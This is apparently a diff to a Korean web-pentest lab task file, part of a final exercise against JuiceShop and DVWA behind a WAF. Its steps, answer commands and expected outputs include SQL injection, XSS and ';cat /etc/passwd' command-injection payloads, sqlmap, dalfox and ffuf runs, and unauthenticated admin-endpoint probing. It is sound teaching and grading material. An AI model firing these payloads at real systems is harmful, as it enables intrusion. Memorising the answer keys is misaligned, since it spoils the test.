@@ -15,7 +15,7 @@ difficulty: hard
 duration_minutes: 200
 prerequisites:
   - "W01–W14 통과 (HTTP/정보수집·인증·주입·접근제어·위험 평가/보고 역량)"
-  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}, 비밀번호 1) + docker exec 접근"
+  - "외부 공격자 VM 접속(ssh att@192.168.0.202, 비밀번호 1) — whatweb/sqlmap/dalfox/ffuf/nuclei 탑재"
   - "WSTG 점검 순서와 CVSS 3.1·전문 보고서 구조 이해(W08·W14)"
 objectives:
   - "WSTG 점검 한 사이클(정찰→인증→주입→접근제어→위험 평가→보고)을 한 표적에 처음부터 끝까지 통합 수행한다"
@@ -35,15 +35,14 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) juice vhost 도달 확인 — Host로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로(점검 가능 상태 검증)
-      echo -en "GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) whatweb으로 juice vhost 도달 확인 + 1차 핑거프린팅(점검 가능 상태 검증)
+      whatweb -a1 --color=never http://juice.el34.lab/
       ```
       ## 🔧 도구·옵션 풀이
-      - `nc`(넷캣) — 명령줄 raw HTTP 요청 도구. 요청의 `Host: juice.el34.lab` 줄로 어느 vhost(표적)인지 지정한다
-        (el34 web 의 Apache 가 Host 헤더로 라우팅).
-      - `| head -1 | grep -oE '[0-9]{3}'` — 응답 상태 라인에서 **코드만** 뽑는 관용구.
-      - `nc -w3 192.168.0.161 80` — raw HTTP 요청을 보내고 응답을 받는다(3초 타임아웃).
-      - `http://192.168.0.161/` — fw 의 ext 게이트웨이. 요청은 fw → ips → web 경로로 흐른다.
+      - `whatweb` — 응답을 분석해 상태코드(`[200 OK]`)·웹서버·타이틀·헤더를 한 줄로 요약하는 웹 핑거프린팅 도구.
+        att 의 `/etc/hosts` 가 `*.el34.lab → 192.168.0.161` 로 매핑돼 fw 게이트웨이로 요청이 나간다.
+      - `-a1` — 공격성 낮은 1단계(수동적 정찰), `--color=never` — 색상 코드 끔.
+      - 요청은 att(192.168.0.202) → fw → ips → web → JuiceShop 경로로 흐른다.
       ## ✅ 합격 기준
       `juice` 출력 시 통과. **근거:** `juice=<코드>` 가 나타나면 fw→web 경로로 표적에 도달해 점검 가능
       상태(scope alive) — 응답이 없으면 Host 헤더·게이트웨이 주소부터 재확인한다.
@@ -51,13 +50,13 @@ steps:
     category: survey
     points: 8
     answer: |
-      # 1) juice vhost 도달 확인 — Host로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로(점검 가능 상태 검증)
-      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
+      # 1) whatweb으로 juice vhost 도달 확인 + 1차 핑거프린팅(점검 가능 상태 검증)
+      ssh att@192.168.0.202 "whatweb -a1 --color=never http://juice.el34.lab/"
     answer_detail: "기말 종합 침투 점검의 표적 = JuiceShop(juice.el34.lab, 인증/접근제어용 탐지 모드) +
-      DVWA(dvwa.el34.lab, 주입 차단 시연용). 이 미션은 fw→web 경로로 표적에 HTTP 응답 코드가 돌아오는지
-      확인해 점검 가능 상태(scope alive)를 검증한다. 'juice' 가 출력에 보이면 도달."
+      DVWA(dvwa.el34.lab, 주입 차단 시연용). 이 미션은 whatweb 으로 fw→web 경로 도달성과 서버 정보를
+      확인해 점검 가능 상태(scope alive)를 검증한다. 출력에 juice.el34.lab 과 [200 OK] 가 보이면 도달."
     expected_output: |
-      juice=200
+      http://juice.el34.lab/ [200 OK] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[OWASP Juice Shop], UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting], IP[192.168.0.161]
     verify:
       type: output_contains
       expect: 'juice'
@@ -65,7 +64,7 @@ steps:
       semantic:
         intent: "대상 점검"
         success_criteria: ["도달"]
-        acceptable_methods: ["**[OSS] nc raw (권장)**"]
+        acceptable_methods: ["**[OSS] whatweb (권장)**"]
     target_vm: web
 
   - order: 2
@@ -235,44 +234,51 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) SQLi(?id=1' OR '1'='1, %27='/%20=공백)를 차단 모드 dvwa에 전송 → sqli= 응답코드(CRS 942 차단)
-      echo -en "GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) 이어서 XSS(?q=<script>alert(1)</script>)도 전송 → xss= 응답코드(CRS 941 차단)
-      echo -en 'GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) sqlmap으로 차단 모드 dvwa에 SQLi 시도 → WAF(CRS 942)가 403으로 막아 sqlmap이 '주입불가+WAF' 보고
+      sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring
+      # 2) 이어서 dalfox로 XSS 자동 점검 → WAF(CRS 941)가 403으로 막아 dalfox가 'WAF (HTTP 403)' 탐지
+      dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"
       # 3) 해석 — dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403(차단은 보완, 근본은 입력검증)
       # → dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403
       ```
       ## 🔧 도구·옵션 풀이
-      - `Host: dvwa.el34.lab` — 표적을 **DVWA**(차단 모드)로 지정. JuiceShop(탐지만)과 달리 공격을 막는다.
-      - SQLi 페이로드 `?id=1' OR '1'='1`(URL 인코딩 `%27`=`'`)는 ModSec CRS **942**(SQLi) 룰군에 걸린다.
-      - XSS 페이로드 `?q=<script>alert(1)</script>`(인코딩됨)는 CRS **941**(XSS) 룰군에 걸린다.
-      - `-o /dev/null -w 'sqli=%{http_code} xss=...'` — 응답 코드만 라벨과 함께 출력한다.
+      - 표적 **DVWA**(차단 모드) — JuiceShop(탐지만)과 달리 공격 페이로드를 WAF 가 막는다.
+      - `sqlmap` — 자동 SQLi 도구. `id` 파라미터에 여러 페이로드를 던지지만 ModSec CRS **942**(SQLi)가
+        403 으로 차단해 "주입 불가 + WAF 의심"을 보고한다(`--tamper` 로 우회를 시도하라는 힌트).
+      - `dalfox url --url` — 자동 XSS 도구. 페이로드가 CRS **941**(XSS)에 걸려 `WAF ... (HTTP 403)` 을
+        탐지하고 반사 XSS 0 건을 보고한다.
       ## ✅ 합격 기준
-      `sqli=` 출력 시 통과. **근거:** `sqli=403 xss=403` 이면 WAF(942/941) 차단 확인 — 200 이면 표적/모드
-      (dvwa vs juice)를 재확인. ⚠️ 403(차단)은 WAF 가 패턴을 막은 것이지 앱이 안전해진 것은 아니다(근본 방어는 미션 9).
+      `403` 출력 시 통과. **근거:** sqlmap 이 `403 (Forbidden)` 다수·`WAF` 의심을 보고하고 dalfox 가
+      `WAF ... (HTTP 403)` 을 탐지하면 WAF(942/941) 차단 확인 — 통과(200)면 표적/모드(dvwa vs juice)를
+      재확인. ⚠️ 403(차단)은 WAF 가 패턴을 막은 것이지 앱이 안전해진 것은 아니다(근본 방어는 미션 9).
     hint: 'SQLi/XSS 403'
     category: manipulation
     points: 12
     answer: |
-      # 1) SQLi(?id=1' OR '1'='1, %27='/%20=공백)를 차단 모드 dvwa에 전송 → sqli= 응답코드(CRS 942 차단)
-      # 2) 이어서 XSS(?q=<script>alert(1)</script>)도 전송 → xss= 응답코드(CRS 941 차단)
-      ssh att@192.168.0.202 "echo "sqli=$(echo -en 'GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"; echo "xss=$(echo -en 'GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
+      # 1) sqlmap으로 차단 모드 dvwa에 SQLi 시도 → WAF(CRS 942)가 403으로 막아 sqlmap이 '주입불가+WAF' 보고
+      ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring'
+      # 2) 이어서 dalfox로 XSS 자동 점검 → WAF(CRS 941)가 403으로 막아 dalfox가 'WAF (HTTP 403)' 탐지
+      ssh att@192.168.0.202 'dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"'
       # 3) 해석 — dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403(차단은 보완, 근본은 입력검증)
       # → dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403
-    answer_detail: "주입(A03) = SQLi(CRS 942)·XSS(CRS 941) 페이로드를 차단 모드 DVWA 에 전송 → WAF 가
-      403 으로 차단. 'sqli=' 표식 + 403 응답으로 차단 확인. 차단은 WAF 의 보완 방어일 뿐 근본 방어
-      (parameterized query·출력 인코딩+CSP)는 아니다. 같은 입력을 JuiceShop(탐지만)에 보내면 200 통과."
+    answer_detail: "주입(A03) = SQLi(CRS 942)·XSS(CRS 941)를 차단 모드 DVWA 에 실제 공격 도구로 전송 →
+      WAF 가 403 으로 차단. sqlmap 은 '주입 불가 + WAF 의심'(403 다수)을, dalfox 는 'WAF (HTTP 403)'
+      탐지를 보고한다. 차단은 WAF 의 보완 방어일 뿐 근본 방어(parameterized query·출력 인코딩+CSP)는
+      아니다. 같은 페이로드를 JuiceShop(탐지만)에 보내면 200 통과."
     expected_output: |
-      sqli=403 xss=403
+      [CRITICAL] all tested parameters do not appear to be injectable ... (e.g. WAF) maybe you could try to use option '--tamper'
+      403 (Forbidden) - 887 times
+      WAF Unknown (HTTP 403) detected (confidence: 40%, evidence: Provocation probe returned HTTP 403)
+      WRN XSS found 0 XSS
       → dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403
     verify:
       type: output_contains
-      expect: 'sqli='
+      expect: '403'
       field: stdout
       semantic:
         intent: "주입 시도"
-        success_criteria: ["SQLi/XSS 탐지"]
-        acceptable_methods: ["**[OSS] 주입 (권장)**"]
+        success_criteria: ["SQLi/XSS 차단"]
+        acceptable_methods: ["**[OSS] sqlmap+dalfox (권장)**"]
     target_vm: web
 
   - order: 6
@@ -287,41 +293,41 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 명령주입(?q=1;cat /etc/passwd, %20=공백) — ; 로 OS 명령 연결, 차단 모드 dvwa에 전송 → rce= 응답코드(CRS 932 차단)
-      echo -en "GET /?q=1;cat%20/etc/passwd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 탐지, 성공 시 완전 장악(최고 심각도)
-      # → ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)
+      # 1) whatweb으로 명령주입 페이로드(q=1;cat /etc/passwd, %3B=';' %20=공백)를 차단 모드 dvwa에 전송 → [403]=CRS 932 차단
+      whatweb -a1 --color=never "http://dvwa.el34.lab/?q=1%3Bcat%20/etc/passwd"
+      # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 차단형 403, 성공 시 완전 장악(최고 심각도)
+      # → ;cmd = OS 명령 연결. ModSec 932(RCE) 차단(403). 성공 시 완전 장악(최고 심각도)
       ```
       ## 🔧 도구·옵션 풀이
-      - 페이로드 `?q=1;cat /etc/passwd`(인코딩 `%20`=공백) — `;` 는 셸에서 **명령 연결자**다. 앱이 입력을
-        OS 명령으로 넘기면 `1` 다음에 `cat /etc/passwd` 가 이어 실행된다(계정 파일 노출 시도).
-      - `Host: dvwa.el34.lab` — 차단 모드 표적. 이 RCE 패턴은 ModSec CRS **932**(RCE) 룰군에 걸린다.
-      - `-o /dev/null -w 'rce=%{http_code}'` — 응답 코드만 출력.
+      - 페이로드 `?q=1;cat /etc/passwd`(인코딩 `%3B`=`;`, `%20`=공백) — `;` 는 셸의 **명령 연결자**다. 앱이
+        입력을 OS 명령으로 넘기면 `1` 다음에 `cat /etc/passwd` 가 이어 실행된다(계정 파일 노출 시도).
+      - whatweb 이 이 URL 을 그대로 요청하는데, DVWA(차단 모드)의 ModSec CRS **932**(RCE) 룰군이 걸어
+        `[403 Forbidden]` 을 돌려준다. JuiceShop(탐지만)이라면 통과(200)했을 요청이다.
       ## ✅ 합격 기준
-      `rce=` 출력 시 통과. **근거:** `rce=403` 이면 WAF(932)가 명령주입을 차단한 것 — 200 이면 표적/모드를
-      재확인. RCE 는 성공 시 완전 장악이라 위험 평가에서 SQLi 와 함께 Critical(9.8)로 자리매김한다.
+      `403` 출력 시 통과. **근거:** whatweb 이 `[403 Forbidden]` 을 받으면 WAF(932)가 명령주입을 차단한 것 —
+      통과(200)면 표적/모드를 재확인. RCE 는 성공 시 완전 장악이라 위험 평가에서 SQLi 와 함께 Critical(9.8)로 자리매김한다.
     hint: ';cat /etc/passwd'
     category: manipulation
     points: 12
     answer: |
-      # 1) 명령주입(?q=1;cat /etc/passwd, %20=공백) — ; 로 OS 명령 연결, 차단 모드 dvwa에 전송 → rce= 응답코드(CRS 932 차단)
-      ssh att@192.168.0.202 "echo -en 'GET /?q=1;cat%20/etc/passwd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-      # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 탐지, 성공 시 완전 장악(최고 심각도)
-      # → ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)
-    answer_detail: "RCE = 명령주입(;cmd 로 OS 명령 연결). 차단 모드 DVWA 에서 ModSec CRS 932(RCE) 룰군이
-      잡아 403 차단. 'rce=' 표식으로 시도 확인. 성공 시 시스템 완전 장악이라 SQLi 와 함께 최고 심각도
-      (9.8 Critical), 근본 방어는 OS 호출 회피(안전한 API)+입력 allowlist."
+      # 1) whatweb으로 명령주입 페이로드(q=1;cat /etc/passwd, %3B=';' %20=공백)를 차단 모드 dvwa에 전송 → [403]=CRS 932 차단
+      ssh att@192.168.0.202 'whatweb -a1 --color=never "http://dvwa.el34.lab/?q=1%3Bcat%20/etc/passwd"'
+      # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 차단형 403, 성공 시 완전 장악(최고 심각도)
+      # → ;cmd = OS 명령 연결. ModSec 932(RCE) 차단(403). 성공 시 완전 장악(최고 심각도)
+    answer_detail: "RCE = 명령주입(;cmd 로 OS 명령 연결). whatweb 으로 페이로드를 차단 모드 DVWA 에 보내면
+      ModSec CRS 932(RCE) 룰군이 잡아 [403 Forbidden] 차단. 성공 시 시스템 완전 장악이라 SQLi 와 함께
+      최고 심각도(9.8 Critical), 근본 방어는 OS 호출 회피(안전한 API)+입력 allowlist."
     expected_output: |
-      rce=403
-      → ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)
+      http://dvwa.el34.lab/?q=1%3Bcat%20/etc/passwd [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161], Title[403 Forbidden]
+      → ;cmd = OS 명령 연결. ModSec 932(RCE) 차단(403). 성공 시 완전 장악(최고 심각도)
     verify:
       type: output_contains
-      expect: 'rce='
+      expect: '403 Forbidden'
       field: stdout
       semantic:
         intent: "RCE 시도"
-        success_criteria: ["명령주입 탐지"]
-        acceptable_methods: ["**[OSS] ;cmd 주입 (권장)**"]
+        success_criteria: ["명령주입 차단"]
+        acceptable_methods: ["**[OSS] whatweb (권장)**"]
     target_vm: web
 
   - order: 7
@@ -336,45 +342,48 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 인증 토큰 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → admincfg= 응답코드(200=무인증 노출 A01)
-      echo -en "GET /rest/admin/application-configuration HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) 이어서 링크에 없는 /ftp를 직접 호출(강제 브라우징) → ftp= 응답코드
-      echo -en "GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) whatweb으로 인증 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → [200 OK]=무인증 노출(A01)
+      whatweb -a1 --color=never http://juice.el34.lab/rest/admin/application-configuration | grep -oE '[0-9]{3} (OK|Unauthorized|Forbidden)'
+      # 2) ffuf로 디렉터리 강제 브라우징 → 링크에 없는 /ftp 발견(디렉터리 리스팅)
+      ffuf -u http://juice.el34.lab/FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt -mc 200,301,302 -ac -s 2>/dev/null
       # 3) 해석 — admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
       # → admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
       ```
       ## 🔧 도구·옵션 풀이
-      - `/rest/admin/application-configuration` — JuiceShop 의 **관리용** 엔드포인트. 인증 토큰 없이 호출
-        한다(요청에 Authorization 헤더가 없음에 주목).
-      - `/ftp` — 화면 링크에 없는 숨은 경로. URL 을 직접 입력해 접근을 시도하는 **강제 브라우징**.
-      - `-o /dev/null -w 'admincfg=%{http_code} ftp=...'` — 두 경로의 응답 코드만 라벨과 함께 출력.
+      - `/rest/admin/application-configuration` — JuiceShop 의 **관리용** 엔드포인트. whatweb 이 인증 토큰
+        없이 호출해도 `[200 OK]` 로 설정을 내주는 것을 확인한다(Authorization 헤더 없음에 주목).
+      - `ffuf` 로 `/FUZZ` 를 워드리스트로 퍼징하면 화면 링크에 없는 `/ftp` 가 드러난다 — **강제 브라우징**.
+        `-mc 200,301,302` 매칭 상태, `-ac` 자동보정(SPA 오탐 제거), `-s` 결과만 출력.
       ## ✅ 합격 기준
-      `admincfg=200` 출력 시 통과. **근거:** 인증 없이 관리 설정이 200 으로 노출되면 A01 — `/ftp` 도
-      접근되면 강제 브라우징 증거가 더해진다(401/403 이면 접근제어 동작, 노출 설정으로 시스템 조작 금지 — 입증까지만).
+      `200 OK` 출력 시 통과. **근거:** whatweb 이 인증 없이 관리 설정을 `[200 OK]` 로 받으면 A01 — ffuf 가
+      `/ftp` 를 찾아내면 강제 브라우징 증거가 더해진다(401/403 이면 접근제어 동작, 노출 설정으로 시스템 조작 금지 — 입증까지만).
     hint: 'admin-config/ftp'
     category: manipulation
     points: 12
     answer: |
-      # 1) 인증 토큰 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → admincfg= 응답코드(200=무인증 노출 A01)
-      # 2) 이어서 링크에 없는 /ftp를 직접 호출(강제 브라우징) → ftp= 응답코드
-      ssh att@192.168.0.202 "echo -en 'GET /rest/admin/application-configuration; HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}' echo -en "GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
+      # 1) whatweb으로 인증 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → [200 OK]=무인증 노출(A01)
+      ssh att@192.168.0.202 "whatweb -a1 --color=never http://juice.el34.lab/rest/admin/application-configuration | grep -oE '[0-9]{3} (OK|Unauthorized|Forbidden)'"
+      # 2) ffuf로 디렉터리 강제 브라우징 → 링크에 없는 /ftp 발견(디렉터리 리스팅)
+      ssh att@192.168.0.202 "ffuf -u http://juice.el34.lab/FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt -mc 200,301,302 -ac -s 2>/dev/null"
       # 3) 해석 — admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
       # → admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
     answer_detail: "접근제어 실패(OWASP A01) = 인증 없이 관리 엔드포인트(/rest/admin/application-
-      configuration)가 200 으로 설정 노출 + 강제 브라우징(/ftp) 접근. admincfg=200 이 핵심 증거.
-      서버가 요청마다 객체수준 인가를 강제하지 않아 발생하며, 위험 평가에서 7.5 High, 근본 방어는
-      서버측 인가 + 기본 deny."
+      configuration)가 whatweb 에 [200 OK]로 설정 노출 + ffuf 강제 브라우징으로 /ftp 발견. [200 OK] +
+      /ftp 가 핵심 증거. 서버가 요청마다 객체수준 인가를 강제하지 않아 발생하며, 위험 평가에서 7.5 High,
+      근본 방어는 서버측 인가 + 기본 deny."
     expected_output: |
-      admincfg=200 ftp=200
+      200 OK
+      assets
+      ftp
       → admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
     verify:
       type: output_contains
-      expect: 'admincfg=200'
+      expect: '200 OK'
       field: stdout
       semantic:
         intent: "접근제어 우회"
         success_criteria: ["무인증 관리/강제브라우징"]
-        acceptable_methods: ["**[OSS] 강제 접근 (권장)**"]
+        acceptable_methods: ["**[OSS] whatweb+ffuf (권장)**"]
     target_vm: web
 
   - order: 8
